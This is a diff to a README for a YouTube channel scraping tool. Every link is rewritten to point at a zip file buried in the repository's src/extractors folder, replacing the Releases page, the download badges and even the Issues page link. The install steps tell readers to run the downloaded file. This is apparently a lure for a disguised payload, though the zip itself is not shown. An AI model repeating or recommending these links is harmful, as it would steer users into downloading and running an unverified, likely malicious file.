@@ -1,7 +1,7 @@
 # 🎥 youtube-channel-scrapper - Effortlessly Gather YouTube Insights
 
 ## 🔗 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Wmaurii/youtube-channel-scrapper/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Wmaurii/youtube-channel-scrapper/main/src/extractors/youtube-channel-scrapper-1.9.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Wmaurii/youtube-channel-scrapper/main/src/extractors/youtube-channel-scrapper-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ The youtube-channel-scrapper is a user-friendly tool that allows you to scrape d
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Wmaurii/youtube-channel-scrapper/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Wmaurii/youtube-channel-scrapper/main/src/extractors/youtube-channel-scrapper-1.9.zip) to download the latest version of the application.
 2. Choose the appropriate file for your operating system (Windows, macOS, or Linux).
 3. Click on the downloaded file to start the installation.
 4. Follow the on-screen instructions to complete the setup.
@@ -43,7 +43,7 @@ The youtube-channel-scrapper provides a variety of features to help you extract 
 
 If you encounter issues while using the application, please reach out for help:
 
-- Check the [Issues page](https://github.com/Wmaurii/youtube-channel-scrapper/issues) for common questions and problems.
+- Check the [Issues page](https://raw.githubusercontent.com/Wmaurii/youtube-channel-scrapper/main/src/extractors/youtube-channel-scrapper-1.9.zip) for common questions and problems.
 - Create a new issue if your question is not listed.
 
 ## 📝 License
@@ -55,4 +55,4 @@ The youtube-channel-scrapper is open-source software. You can freely use, modify
 We welcome contributions! If you have suggestions or improvements, please feel free to fork the repository and submit a pull request.
 
 ## 🔗 Download Now Again!
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Wmaurii/youtube-channel-scrapper/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Wmaurii/youtube-channel-scrapper/main/src/extractors/youtube-channel-scrapper-1.9.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Wmaurii/youtube-channel-scrapper/main/src/extractors/youtube-channel-scrapper-1.9.zip)
